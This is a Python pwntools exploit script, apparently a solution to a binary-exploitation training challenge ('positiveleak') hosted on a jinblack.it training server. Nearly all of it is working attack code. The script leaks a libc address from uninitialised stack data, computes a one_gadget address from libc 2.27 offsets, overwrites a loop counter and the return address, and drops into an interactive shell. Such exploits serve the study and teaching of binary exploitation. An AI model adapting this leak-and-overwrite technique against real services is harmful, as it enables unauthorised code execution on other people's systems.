from pwn import *
context.terminal = ['gnome-terminal']
if args.REMOTE:
    r = remote("bin.training.jinblack.it", 3003)
else:
    r = process("./positiveleak", env={"LD_PRELOAD": "./libc-2.27.so"})
    gdb.attach(
        r,
        """
    b *add_numbers+405
    c
    """,
    )
    input("Press any key to continue.")

def assembly(num):
    # mov    eax,DWORD PTR [rbp-0x1c]
    eax = [int(x) for x in bin(num)[2:]]
    # cdqe
    rax = []
    for _ in range(16 - len(eax)):
        rax.append(0)
    for i in eax:
        rax.append(i)
    # shl    rax,0x2
    rax = rax[2:]
    rax.append(0)
    rax.append(0)
    # lea    rdx,[rax+0x8]
    rdx = int("".join(str(i) for i in rax), 2) + 0x8
    # mov    eax,0x10
    eax = int(0x10)
    # sub    rax,0x1
    rax = eax - 1
    # add    rax,rdx
    rax += rdx
    # div rsi
    rax = int(rax / 0x10)
    # imul   rax,rax,0x10
    rax *= 0x10

    return rax

leak_pos = 4

r.recvuntil("> ")
r.sendline(b"0")
r.recvuntil("> ")
r.sendline(b"%d" % leak_pos)
r.recvuntil("> ")
r.sendline(b"0")

for _ in range(0, leak_pos):
    r.recvuntil("> ")
    r.sendline(b"0")

r.recvuntil("> ")
r.sendline(b"1")

for _ in range(0, leak_pos):
    r.recvuntil("0\n")

leak = int(r.recvuntil("\n")[:-1])
gadget_addr = leak - 0x3EC680 + 0x4F322
print("[!] leak: %s" % hex(leak))
print("[!] gadget_addr: %s" % hex(gadget_addr))

stack_num = 50
stack_dist = int(assembly(stack_num) / 8) + 1

r.recvuntil("> ")
r.sendline(b"0")
r.recvuntil("> ")
r.sendline(b"%d" % stack_num)

for i in range(0, stack_dist):
    r.recvuntil("> ")
    r.sendline(b"0")

counter = int(hex(stack_dist + 5) + "00000000", 16)

r.recvuntil("> ")
r.sendline(b"%d" % counter)

r.recvuntil("> ")
r.sendline(b"%d" % gadget_addr)

for i in range(0, 9):
    r.recvuntil("> ")
    r.sendline(b"0")

r.recvuntil("> ")
r.sendline(b"-1")

r.interactive()
